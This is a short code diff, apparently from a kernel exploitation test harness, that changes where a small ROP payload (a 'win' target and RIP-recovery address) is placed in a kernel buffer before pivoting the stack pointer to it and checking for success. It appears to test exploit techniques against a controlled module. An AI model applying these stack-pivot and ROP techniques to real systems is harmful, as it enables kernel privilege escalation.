@@ -84,14 +84,13 @@ public:
         auto rip_recovery = kpwn_->GetRipControlRecoveryAddr();
         Log("win_target = 0x%lx, rip_recovery = 0x%lx", win_target, rip_recovery);
 
-        int rop_offs = 128;
         Payload p(256);
-        p.Set(rop_offs + 0, win_target);
-        p.Set(rop_offs + 8, rip_recovery);
+        p.Set(0, win_target);
+        p.Set(8, rip_recovery);
         auto buf_addr = kpwn_->AllocBuffer(p.GetData(), true);
         Log("buf_addr = 0x%lx", buf_addr);
 
-        kpwn_->SetRspAndRet(buf_addr + rop_offs);
+        kpwn_->SetRspAndRet(buf_addr);
         kpwn_->CheckWin();
         kpwn_->Kfree(buf_addr);
     }
